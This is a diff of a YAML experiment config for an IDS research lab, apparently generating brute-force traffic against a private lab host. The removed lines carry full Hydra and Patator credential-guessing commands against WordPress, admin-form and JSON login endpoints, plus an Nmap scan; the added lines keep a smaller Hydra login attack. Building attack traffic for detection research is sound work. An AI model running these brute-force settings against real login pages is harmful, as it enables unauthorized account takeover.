@@ -1,113 +1,17 @@
-# ML IDS Lab — Brute Force HTTP (Hydra) — V2 (dirs fix + variantes robustas)
-version: 1
-name: exp_brute_http_v2
-description: >
-  Pipeline de varredura + brute force HTTP/HTTPS com Hydra (e fallback Patator),
-  gerando artefatos em ~/exp_nmap e ~/exp_brute. Inclui criação de pastas,
-  wordlists e checagens de ferramenta.
-
+exp_id: "EXP_BRUTE_HTTP"
 targets:
-  victim_ip: "192.168.56.12"   # ajuste se necessário
-
+  victim_ip: "192.168.56.20"
 capture:
   rotate_seconds: 300
   rotate_size_mb: 100
-
-# Pequenas listas default; você pode sobrescrever via brute.users_inline / brute.pass_inline
-brute:
-  users_inline: ["admin","user","test","tcc"]
-  pass_inline:  ["123456","password","wrongpass","tcc2025"]
-
+  zeek_rotate_seconds: 3600
 actions:
-  # 0) Preparação: pastas, wordlists e saúde do Hydra (ou aviso de fallback)
-  - name: custom
-    title: "Preparar diretórios, listas e Hydra"
-    description: "Garante ~/exp_nmap e ~/exp_brute; cria listas simples; confirma hydra/patator."
-    host: attacker
-    command: |
-      set -euo pipefail
-      mkdir -p ~/exp_nmap ~/exp_brute
-      test -f ~/users.txt     || printf "admin\nuser\ntest\ntcc\n" > ~/users.txt
-      test -f ~/passwords.txt || printf "123456\npassword\nwrongpass\ntcc2025\n" > ~/passwords.txt
-      if command -v hydra >/dev/null 2>&1; then
-        echo "[prep] hydra OK: $(hydra -V 2>/dev/null | head -1)"
-      else
-        echo "[prep] hydra ausente; tentarei patator como fallback (se instalado)"
-        command -v patator >/dev/null 2>&1 || echo "[prep] patator também ausente — somente Nmap rodará"
-      fi
-      wc -l ~/users.txt ~/passwords.txt
-
-  # 1) Recon: Nmap com http-title/headers para confirmar alvo web
-  - name: nmap_scan
+  - name: "hydra_http_post"
     params:
-      flags: "-sS -sV -T4 --open --script http-title,http-headers -Pn"
-      ports: "80,443,8080,8000,5000"
-      output: "~/exp_nmap/login_scan"
-
-  # 2) WordPress (HTTP). F=login_error é padrão de falha do WP; S=wp-admin sugere sucesso.
-  - name: hydra_brute
-    params:
-      service: "http-post-form"
-      port: 80
-      path: "/wp-login.php:log=^USER^&pwd=^PASS^:F=login_error:S=wp-admin"
-      user: "~/users.txt"
-      pass_list: "~/passwords.txt"
-      extra: "-t 16 -f -I -V"
-      output: "~/exp_brute/hydra_wp_http.txt"
-
-  # 3) WordPress (HTTPS)
-  - name: hydra_brute
-    params:
-      service: "https-post-form"
-      port: 443
-      path: "/wp-login.php:log=^USER^&pwd=^PASS^:F=login_error:S=wp-admin"
-      user: "~/users.txt"
-      pass_list: "~/passwords.txt"
-      extra: "-t 16 -f -I -V"
-      output: "~/exp_brute/hydra_wp_https.txt"
-
-  # 4) Form HTML genérico (ajuste campos e strings F/S conforme o app-alvo)
-  - name: hydra_brute
-    params:
-      service: "http-post-form"
-      port: 80
-      path: "/admin/login:username=^USER^&password=^PASS^:F=incorrect:S=dashboard"
-      user: "~/users.txt"
-      pass_list: "~/passwords.txt"
-      extra: "-t 16 -f -I -V"
-      output: "~/exp_brute/hydra_html.txt"
-
-  # 5) API JSON (com header explícito). S=token se resposta contém 'token'
-  - name: hydra_brute
-    params:
-      service: "http-post-form"
-      port: 80
-      path: '/api/login:{"user":"^USER^","pass":"^PASS^"}:F=invalid:S=token:H=Content-Type\:\ application/json'
-      user: "~/users.txt"
-      pass_list: "~/passwords.txt"
-      extra: "-t 16 -f -I -V"
-      output: "~/exp_brute/hydra_json.txt"
-
-  # 6) Fallback opcional com Patator (caso Hydra não esteja disponível)
-  #    ATENÇÃO: Se alterar targets.victim_ip, atualize a URL abaixo também.
-  - name: custom
-    title: "Fallback: patator http_fuzz (JSON)"
-    description: "Executa brute via patator como alternativa ao Hydra, útil para JSON/CSRF dinâmico."
-    host: attacker
-    command: |
-      set -euo pipefail
-      if command -v hydra >/dev/null 2>&1; then
-        echo "[skip] hydra presente; pulando patator"
-        exit 0
-      fi
-      if ! command -v patator >/dev/null 2>&1; then
-        echo "[skip] patator ausente"
-        exit 0
-      fi
-      patator http_fuzz method=POST url="http://192.168.56.12/api/login" \
-        body='{"user":"FILE0","pass":"FILE1"}' header="Content-Type: application/json" \
-        0=~/users.txt 1=~/passwords.txt accept_cookie=1 follow=1 \
-        -x ignore:code=401-404 -x ignore:fgrep=invalid -x retry:code=429 \
-        --threads=10 --timeout=5 \
-        >> ~/exp_brute/patator_json.log 2>&1
-      echo "[patator] saída em ~/exp_brute/patator_json.log"
+      path: "/login"
+      user: "webuser"
+      pass_list: ["secret", "123456", "admin", "password"]
+      fail_regex: "invalid"
+      port: 8081
+      output: "exp_brute_http.hydra"
+      threads: 4
